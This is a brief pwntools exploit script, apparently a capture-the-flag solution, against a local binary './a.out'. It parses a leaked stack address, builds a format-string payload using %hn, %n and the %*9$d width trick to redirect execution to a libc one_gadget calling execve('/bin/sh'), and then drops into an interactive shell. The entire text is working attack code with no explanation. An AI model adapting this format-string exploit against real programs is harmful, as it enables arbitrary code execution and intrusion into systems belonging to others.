from pwn import *

p = process("./a.out")

stack = int(p.recvline().strip("\n"),16)
print hex(stack)
'''
0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
offset = 0xd0917#onegadget - (libc_start_main + 240)

payload = "%c"*9 + "%" + str((stack+0x20-9) & 0xffff) + "d%hn" + "%c" * 23 + "%" + str(offset-23-((stack&0xffff)+0x20)) + "d%*9$d%n" 
p.sendline(payload)
p.interactive()